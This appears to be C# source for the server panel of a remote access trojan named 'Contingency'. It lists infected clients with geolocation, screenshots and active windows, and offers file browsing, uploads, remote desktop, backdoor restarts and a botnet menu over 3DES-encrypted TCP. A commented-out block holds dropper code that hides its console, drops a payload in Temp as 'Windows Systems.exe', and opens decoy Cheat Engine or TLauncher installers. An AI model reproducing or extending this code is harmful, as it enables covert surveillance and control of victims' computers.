using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using SimpleTCP;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace server
{
	public partial class Form1 : Form
	{
		/*
			// get hwid
			string hwid = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001", "HwProfileGuid", null).ToString();
		
			// tot ce era in embed.exe
				[DllImport("kernel32.dll")]
				static extern IntPtr GetConsoleWindow();
				[DllImport("user32.dll")]
				static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
				const int SW_HIDE = 0;
				const int SW_SHOW = 5;

				static void Main(string[] args)
				{
					System.Drawing.Bitmap img = new System.Drawing.Bitmap(Properties.Resources.photo);
					img.Save("photo.jpg");
					File.WriteAllBytes("tmp.exe", Properties.Resources.CheatEngine72);
					Process.Start("photo.jpg");
					Process.Start("tmp.exe");

					Thread.Sleep(1000);
					File.Delete("tmp.exe");
					Console.WriteLine("xx");
					Console.Read();
			
					// schimba din payload.exe in System.exe, sau ceva de genu.
					ShowWindow(GetConsoleWindow(), SW_HIDE);
					string path = Path.GetTempPath() + "\\SimpleTCP.dll";
					if(!File.Exists(path)) File.WriteAllBytes(path, Properties.Resources.SimpleTCP);
					path = Path.GetTempPath() + "\\Windows Systems.exe";
					if (!File.Exists(path)) File.WriteAllBytes(path, Properties.Resources.payload);
					Process.Start(path);
					path = Path.GetTempPath() + "\\TLauncher_Installer.exe";
					if (!File.Exists(path)) File.WriteAllBytes(path, Properties.Resources.TLauncher_2_8_Installer_0_7_1);
					Process.Start(path);
				}


		*/



		// TODO: la fiecare messagebox din Form1.cs se pune threadu pe pauza, astfel clientii intra in timeout.
		// Rezolva prin: functie copie cu parametrii de la messagebox.Show() si bool thread_paused = true; => la raspuns OK bool thread_paused = false;
		// SAU: Mutam tot messagebox-ul pe un thread separat. :| ( prima solutie pare mai buna tho )

		public static Form1 instance;
		public string server_IP = string.Empty;
		public string server_port = string.Empty;
		public int server_cooldown = 3000;
		public class Client
		{
			public string country;
			public string city;
			public string IP;
			public uint port;
			public string environment;
			public double ram;
			public ulong uptime;
			public string active_window;
			public string client_files;
			public ushort timeout;
			public ListViewItem listidentifier;
			public TcpClient tcpidentifier;
			public Bitmap screenshot_desktop;
		};
		public List<Client> clients_list = new List<Client>(100);
		                                         
		public string get_time_from_timestamp(int timestamp)
		{
			int day = (timestamp / 86400); timestamp = timestamp % 86400;
			int hour = (timestamp % 86400) / 3600; timestamp = timestamp % 3600;
			int minute = timestamp / 60;
			int second = timestamp % 60;

			return ((day < 10 ? "0" : "") + day + ":" + (hour < 10 ? "0" : "") + hour + ":" + 
				(minute < 10 ? "0" : "") + minute + ":" + (second < 10 ? "0" : "") + second);
		}

		public SimpleTcpServer server;
		public Form1()
		{
			InitializeComponent();
			instance = this;

			AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);

			server = new SimpleTcpServer();
			server.Delimiter = 0x13;
			server.StringEncoder = Encoding.UTF8;
			server.DelimiterDataReceived += server_dataReceived;
			server.ClientDisconnected += server_clientDisconnected;
			server.ClientConnected += server_clientConnected;

			Thread main_thrd = new Thread(new ThreadStart(MainThread));
			main_thrd.IsBackground = true;
			main_thrd.Start();

			filemanagerStripMenuItem.DropDownItemClicked += mainStripMenuItem_DropDownItemClicked;
			miscStripMenuItem.DropDownItemClicked += mainStripMenuItem_DropDownItemClicked;
			backdoorStripMenuItem.DropDownItemClicked += mainStripMenuItem_DropDownItemClicked;
			networktoolStripMenuItem.DropDownItemClicked += mainStripMenuItem_DropDownItemClicked;

		}

        private void server_clientConnected(object sender, TcpClient e)
		{
			if (server_cooldown > 0) server.BroadcastLine(encryptus("[X]", "D4MVCINM42XS"));
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			FormCollection fc = Application.OpenForms;
			bool bre = false;
			foreach (Form frm in fc)
			{
				if (frm.Name.Equals("serverlog"))
				{
					frm.Focus();
					bre = true;
					return;
				}
			}
			if (bre) return;
			serverlog servlogg = new serverlog();
			servlogg.Show();
		}

		void OnProcessExit(object sender, EventArgs e)
		{
			if (server.IsStarted)
			{
				server.BroadcastLine(encryptus("[X]", "D4MVCINM42XS"));
				server.Stop();
			}
			FormCollection fc = Application.OpenForms;
			foreach (Form frm in fc)
			{
				frm.Close();
			}

		}

		private void MainThread()
		{
			while(true)
			{
				Thread.Sleep(1000);
				if(server.IsStarted && server_cooldown > 0) server_cooldown -= 1000;
				foreach(Client cl in clients_list.ToList())
				{
					cl.uptime++;
					cl.timeout -= 1000;
					if (!this.IsDisposed)
					{
						listView1.Invoke((MethodInvoker)delegate ()
						{
							if (listView1.Items.IndexOf(cl.listidentifier) != -1)
							{
								listView1.Items[listView1.Items.IndexOf(cl.listidentifier)].SubItems[5].Text =
									get_time_from_timestamp((int)cl.uptime);
								listView1.Items[listView1.Items.IndexOf(cl.listidentifier)].SubItems[6].Text =
									cl.active_window;
							}
						});
					}
					if(cl.timeout == 0)
					{
						if (!this.IsDisposed)
						{
							listView1.Invoke((MethodInvoker)delegate ()
							{
								listView1.Items.Remove(cl.listidentifier);
							});
						}
						FormCollection fc = Application.OpenForms;
						foreach (Form frm in fc)
						{
							if (frm.Name.Equals("serverform"))
							{
								serverform.instance.Invoke((MethodInvoker)delegate ()
								{
									serverform.instance.modifyclients(clients_list.Count);
								});
							}
							else if(frm.Name.Equals("serverlog"))
							{
								serverlog.instance.Invoke((MethodInvoker)delegate ()
								{
									serverlog.instance.log(string.Format("Client {0}:{1} ({2}) disconnected.\n", cl.IP, cl.port.ToString(), cl.environment));
								});
							}
						}
						clients_list.Remove(cl);
					}
				}
			}
		}

		private void server_clientDisconnected(object sender, TcpClient e)
		{
			foreach (Client cl in clients_list.ToList())
			{
				if (e.Equals(cl.tcpidentifier))
				{
					if (!this.IsDisposed)
					{
						listView1.Invoke((MethodInvoker)delegate ()
						{
							listView1.Items.Remove(cl.listidentifier);
						});
					}
					clients_list.Remove(cl);
					FormCollection fc = Application.OpenForms;
					foreach (Form frm in fc)
					{
						if (frm.Name.Equals("serverform"))
						{
							serverform.instance.Invoke((MethodInvoker)delegate ()
							{
								serverform.instance.modifyclients(clients_list.Count);
							});
						}
						else if (frm.Name.Equals("serverlog"))
						{
							serverlog.instance.Invoke((MethodInvoker)delegate ()
							{
								serverlog.instance.log(string.Format("Client {0}:{1} ({2}) disconnected.\n", cl.IP, cl.port.ToString(), cl.environment));
							});
						}
					}
					if (!this.IsDisposed)
					{
						this.Invoke((MethodInvoker)delegate ()
						{
							Text = "Contingency - Connected: " + clients_list.Count;
						});
					}
					break;
				}
			}
		}

		public static bool IsValidImage(byte[] bytes)
		{
			try
			{
				using (MemoryStream ms = new MemoryStream(bytes))
					Image.FromStream(ms);
			}
			catch (ArgumentException)
			{
				return false;
			}
			return true;
		}

		private void server_dataReceived(object sender, SimpleTCP.Message e)
		{
			if (server_cooldown > 0) return;
			string fin = dencryptus(e.MessageString, "D4MVCINM42XS");
			if (fin.StartsWith("[?]"))
			{
				string[] split = fin.Split(new[] { "[?]" }, StringSplitOptions.None);
				MessageBox.Show("The client threw an error while processing the command:\n\n" + split[1], "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
			}
			else if (fin.StartsWith("[!]"))
			{
				string[] split = fin.Split(new[] { "[!]" }, StringSplitOptions.None);
				MessageBox.Show("The client sent an information:\n\n" + split[1], "Information", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
			}
			else if (fin.StartsWith("[*]"))
			{
				string[] split = fin.Split(new[] { "[*]" }, StringSplitOptions.None);
				Client new_client = new Client();
				new_client.environment = split[1];
				new_client.ram = double.Parse(split[2]);
				new_client.active_window = split[3];
				new_client.uptime = ulong.Parse(split[4]);
				new_client.tcpidentifier = e.TcpClient;
				new_client.timeout = 5000;
				string[] splitip = e.TcpClient.Client.RemoteEndPoint.ToString().Split(':');
				new_client.IP = splitip[0];
				new_client.port = uint.Parse(splitip[1]);
				clients_list.Add(new_client);
				FormCollection fc = Application.OpenForms;
				foreach (Form frm in fc)
				{
					if (frm.Name.Equals("serverform"))
					{
						serverform.instance.Invoke((MethodInvoker)delegate ()
						{
							serverform.instance.modifyclients(clients_list.Count);
						});
					}
					else if (frm.Name.Equals("serverlog"))
					{
						serverlog.instance.Invoke((MethodInvoker)delegate ()
						{
							serverlog.instance.log(string.Format("Client {0}:{1} ({2}) connected.\n", new_client.IP,
								new_client.port.ToString(), new_client.environment));
						});
					}
				}
				if (!this.IsDisposed)
				{
					Invoke((MethodInvoker)delegate ()
					{
						Text = "Contingency - Connected: " + clients_list.Count;
					});
				}
				string json = String.Empty;
				JObject jsonObj;
				try
				{
					json = new WebClient().DownloadString("https://api.freegeoip.app/json/" + splitip[0] + "?apikey=8ae48100-66e9-11ec-a69c-d18b84583d87");
					jsonObj = JObject.Parse(json);
					string country = "UNKNOWN";
					if (!splitip[0].Equals("127.0.0.1"))
						country = jsonObj["country_name"].ToString() + (jsonObj["city"].ToString().Length > 1 ? "," : "") +
							(jsonObj["city"].ToString().Length > 1 ? jsonObj["city"].ToString() : "");
					string[] row = { country, splitip[0], splitip[1], new_client.environment,
						new_client.ram + " GB", get_time_from_timestamp((int)new_client.uptime), new_client.active_window };
					ListViewItem listViewItem = new ListViewItem(row);
					if (country.StartsWith("Romania")) listViewItem.ImageIndex = 7;
					else if (country.StartsWith("United Kingdom")) listViewItem.ImageIndex = 11;
					else if (country.StartsWith("Germany")) listViewItem.ImageIndex = 12;
					else if (country.StartsWith("Russia")) listViewItem.ImageIndex = 13;
					else if (country.StartsWith("Ukraine")) listViewItem.ImageIndex = 14;
					else if (country.StartsWith("United States")) listViewItem.ImageIndex = 15;
					else if (country.StartsWith("Bulgaria")) listViewItem.ImageIndex = 16;
					else if (country.StartsWith("Hungary")) listViewItem.ImageIndex = 17;
					else if (country.StartsWith("Italy")) listViewItem.ImageIndex = 18;
					else if (country.StartsWith("Serbia")) listViewItem.ImageIndex = 19;
					else listViewItem.ImageIndex = 10;
					if (!this.IsDisposed)
					{
						listView1.Invoke((MethodInvoker)delegate ()
						{
							listView1.Items.Add(listViewItem);
						});
					}
					new_client.listidentifier = listViewItem;
					new_client.country = jsonObj["country_name"].ToString();
					new_client.city = jsonObj["city"].ToString();
				}
				catch (Exception ee)
				{
					MessageBox.Show("The IP geolocator threw an error while processing the request:\n\n" + ee.Message, "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
					//serverlog.instance.log("The IP geolocator threw an error while processing the request\n" +ee.Message);
					string[] row = { "UNKNOWN", splitip[0], splitip[1], new_client.environment,
						new_client.ram + " GB", get_time_from_timestamp((int)new_client.uptime), new_client.active_window };
					ListViewItem listViewItem = new ListViewItem(row);
					listViewItem.ImageIndex = 10;
					if (!this.IsDisposed)
					{
						listView1.Invoke((MethodInvoker)delegate ()
						{
							listView1.Items.Add(listViewItem);
						});
					}
					new_client.listidentifier = listViewItem;
					new_client.country = "UNKNOWN";
					new_client.city = String.Empty;
				}
			}
			else if (fin.StartsWith("[**]"))
			{
				string[] split = fin.Split(new[] { "[**]" }, StringSplitOptions.None);
				foreach (Client cl in clients_list)
				{
					string str = cl.IP + ":" + cl.port.ToString();
					if (e.TcpClient.Client.RemoteEndPoint.ToString().Equals(str))
					{
						cl.active_window = split[1];

						cl.timeout = 5000;

						byte[] byteBuffer = Convert.FromBase64String(split[2]);
						MemoryStream memoryStream = new MemoryStream(byteBuffer);
						cl.screenshot_desktop = (Bitmap)Bitmap.FromStream(memoryStream);
						memoryStream.Close();
						break;
					}
				}
			}
			else if (fin.StartsWith("[***]"))
			{
				string[] split = fin.Split(new[] { "[***]" }, StringSplitOptions.None);
				foreach (string sp in split)
				{
					if (sp == string.Empty) continue;
					if (sp.EndsWith(".folder!"))
					{
						string spp = sp.Replace(".folder!", string.Empty);
						string[] finn = { " " + spp, "Directory" };
						if (!filemanager.instance.IsDisposed)
						{
							filemanager.instance.Invoke((MethodInvoker)delegate ()
							{
								filemanager.instance.addlist(finn, 12);
							});
						}
					}
					else
					{
						int index = 0;
						if (sp.EndsWith(".exe", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".msi", StringComparison.CurrentCultureIgnoreCase)) index = 13;
						else if (sp.EndsWith(".dll", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".sys", StringComparison.CurrentCultureIgnoreCase)) index = 14;
						else if (sp.EndsWith(".txt", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".log", StringComparison.CurrentCultureIgnoreCase) || 
							sp.EndsWith(".cfg", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".ini", StringComparison.CurrentCultureIgnoreCase)) index = 15;
						else if (sp.EndsWith(".zip", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".rar", StringComparison.CurrentCultureIgnoreCase) || 
							sp.EndsWith(".7z", StringComparison.CurrentCultureIgnoreCase)) index = 16;
						else if (sp.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".docx", StringComparison.CurrentCultureIgnoreCase) || 
							sp.EndsWith(".xslx", StringComparison.CurrentCultureIgnoreCase)) index = 17;
						else if (sp.EndsWith(".pdf", StringComparison.CurrentCultureIgnoreCase)) index = 18;
						else if (sp.EndsWith(".torrent", StringComparison.CurrentCultureIgnoreCase)) index = 20;
						else if (sp.EndsWith(".jpg", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".jpeg", StringComparison.CurrentCultureIgnoreCase) || 
							sp.EndsWith(".png", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".bmp", StringComparison.CurrentCultureIgnoreCase) || 
							sp.EndsWith(".gif", StringComparison.CurrentCultureIgnoreCase) || sp.EndsWith(".tif", StringComparison.CurrentCultureIgnoreCase) || 
							sp.EndsWith(".tiff", StringComparison.CurrentCultureIgnoreCase)) index = 21;
						else index = 19;
						string[] finn = { " " + sp, "File" };
						if (!filemanager.instance.IsDisposed)
						{
							filemanager.instance.Invoke((MethodInvoker)delegate ()
							{
								filemanager.instance.addlist(finn, index);
							});
						}
					}
				}
			}
			else if (fin.StartsWith("[****]"))
			{
				string[] split = fin.Split(new[] { "[****]" }, StringSplitOptions.None);
				byte[] bytes = Encoding.UTF8.GetBytes(split[2]);
			}
			else if (fin.StartsWith("[*****]"))
			{
				string[] split = fin.Split(new[] { "[*****]" }, StringSplitOptions.None);
				foreach (string s in split)
				{
					if (s.Equals(split[0])) continue;
					if (!filemanager.instance.IsDisposed)
					{
						filemanager.instance.Invoke((MethodInvoker)delegate ()
						{
							filemanager.instance.addcombolist(s);
						});
					}
				}
			}
		}

		private void listView1_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				var focusedItem = listView1.FocusedItem;
				if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
				{
					contextMenuStrip1.Show(Cursor.Position);
				}
			}
		}

		private void exitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		private void contextMenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
			if (listView1.SelectedItems.Count > 1) return;
			ToolStripItem itm = e.ClickedItem;
		}

		private void mainStripMenuItem_DropDownItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
			if (listView1.SelectedItems.Count > 1) return;
			ToolStripItem itm = e.ClickedItem;
			if (itm == fileManagertoolStripMenuItem)
			{
				FormCollection fc = Application.OpenForms;
				bool bre = false;
				foreach (Form frm in fc)
				{
					if (frm.Name.Equals("filemanager"))
					{
						frm.Focus();
						bre = true;
						return;
					}
				}
				if (bre) return;
				foreach (Client cl in clients_list)
				{
					if (cl.listidentifier == listView1.SelectedItems[0])
					{
						filemanager fileform = new filemanager(cl);
						fileform.Show();
						break;
					}
				}
			}
			else if(itm == uploadfiletoolStripMenuItem)
			{
				FormCollection fc = Application.OpenForms;
				bool bre = false;
				foreach (Form frm in fc)
				{
					if (frm.Name.Equals("uploadfile"))
					{
						frm.Focus();
						bre = true;
						return;
					}
				}
				if (bre) return;
				foreach (Client cl in clients_list)
				{
					if (cl.listidentifier == listView1.SelectedItems[0])
					{
						uploadfile uploadfileform = new uploadfile(cl);
						uploadfileform.Show();
						break;
					}
				}
			}
			else if(itm == messageBoxMenuItem)
			{
				FormCollection fc = Application.OpenForms;
				bool bre = false;
				foreach (Form frm in fc)
				{
					if (frm.Name.Equals("showmessagebox"))
					{
						frm.Focus();
						bre = true;
						return;
					}
				}
				if (bre) return;
				foreach (Client cl in clients_list)
				{
					if (cl.listidentifier == listView1.SelectedItems[0])
					{
						showmessagebox msgform = new showmessagebox(cl);
						msgform.Show();
						break;
					}
				}
			}
			else if(itm == restartbacktoolstripMenu)
			{
				foreach (Client cl in clients_list)
				{
					if (cl.listidentifier == listView1.SelectedItems[0])
					{
						serverlog.instance.log(string.Format("Restarting client {0}:{1} ({2}).\n", cl.IP,
							cl.port.ToString(), cl.environment));
						server.BroadcastLine(
							Form1.instance.encryptus("[X]" + cl.IP + ":" +
							cl.port.ToString(), "D4MVCINM42XS"));
						break;
					}
				}
			}
			else if(itm == botnetToolStripMenuItem)
			{
				FormCollection fc = Application.OpenForms;
				bool bre = false;
				foreach (Form frm in fc)
				{
					if (frm.Name.Equals("botnetform"))
					{
						frm.Focus();
						bre = true;
						return;
					}
				}
				if (bre) return;
				foreach (Client cl in clients_list)
				{
					if (cl.listidentifier == listView1.SelectedItems[0])
					{
						botnetform botnetform = new botnetform(cl);
						botnetform.Show();
						break;
					}
				}
			}
		}

		private void serverToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FormCollection fc = Application.OpenForms;
			bool bre = false;
			foreach (Form frm in fc)
			{
				if (frm.Name.Equals("serverform"))
				{
					frm.Focus();
					bre = true;
					return;
				}
			}
			if (bre) return;
			serverform servform = new serverform();
			servform.Show();
		}

		private void activityToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FormCollection fc = Application.OpenForms;
			bool bre = false;
			foreach (Form frm in fc)
			{
				if (frm.Name.Equals("serverlog"))
				{
					frm.Focus();
					bre = true;
					return;
				}
			}
			if (bre) return;
			serverlog servlogg = new serverlog();
			servlogg.Show();
		}

		private void restartBackdoorsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!server.IsStarted) return;
			DialogResult dialogResult = MessageBox.Show("Are you sure you want to restart all clients?",
				"Are you sure?", System.Windows.Forms.MessageBoxButtons.OKCancel, System.Windows.Forms.MessageBoxIcon.Question);
			if (dialogResult == DialogResult.OK)
			{
				serverlog.instance.log("Restarting all clients.\n");
				foreach (Client cl in clients_list)
				{
					server.BroadcastLine(
						Form1.instance.encryptus("[X]" + cl.IP + ":" +
						cl.port.ToString(), "D4MVCINM42XS"));
				}
			}
		}

		private void remoteDesktopToolstripMenu_Click(object sender, EventArgs e)
		{
			FormCollection fc = Application.OpenForms;
			bool bre = false;
			foreach (Form frm in fc)
			{
				if (frm.Name.Equals("remotedesktop"))
				{
					frm.Focus();
					bre = true;
					return;
				}
			}
			if (bre) return;
			foreach (Client cl in clients_list)
			{
				if (cl.listidentifier == listView1.SelectedItems[0])
				{
					remotedesktop rmtdsktop = new remotedesktop(cl);
					rmtdsktop.Show();
					break;
				}
			}
		}

		public string encryptus(string x, string encrypt)//function
		{
			try
			{
				string y = x;
				byte[] etext = UTF8Encoding.UTF8.GetBytes(y);
				string Code = encrypt;
				MD5CryptoServiceProvider mdhash = new MD5CryptoServiceProvider();
				byte[] keyarray = mdhash.ComputeHash(UTF8Encoding.UTF8.GetBytes(Code));
				TripleDESCryptoServiceProvider tds = new TripleDESCryptoServiceProvider();
				tds.Key = keyarray;
				tds.Mode = CipherMode.ECB;
				tds.Padding = PaddingMode.PKCS7;

				ICryptoTransform itransform = tds.CreateEncryptor();
				byte[] result = itransform.TransformFinalBlock(etext, 0, etext.Length);
				string encryptresult = Convert.ToBase64String(result);
				return encryptresult.ToString();
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}

		public string dencryptus(string x, string keyai)
		{
			try
			{
				string y = x.Replace("\0", null);
				byte[] etext = Convert.FromBase64String(y);
				string key = keyai;
				MD5CryptoServiceProvider mdhash = new MD5CryptoServiceProvider();
				byte[] keyarray = mdhash.ComputeHash(UTF8Encoding.UTF8.GetBytes(key));
				TripleDESCryptoServiceProvider tds = new TripleDESCryptoServiceProvider();
				tds.Key = keyarray;
				tds.Mode = CipherMode.ECB;
				tds.Padding = PaddingMode.PKCS7;

				ICryptoTransform itransform = tds.CreateDecryptor();
				byte[] result = itransform.TransformFinalBlock(etext, 0, etext.Length);
				string dencryptresult = UTF8Encoding.UTF8.GetString(result);
				return dencryptresult.ToString();
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}
    }
}
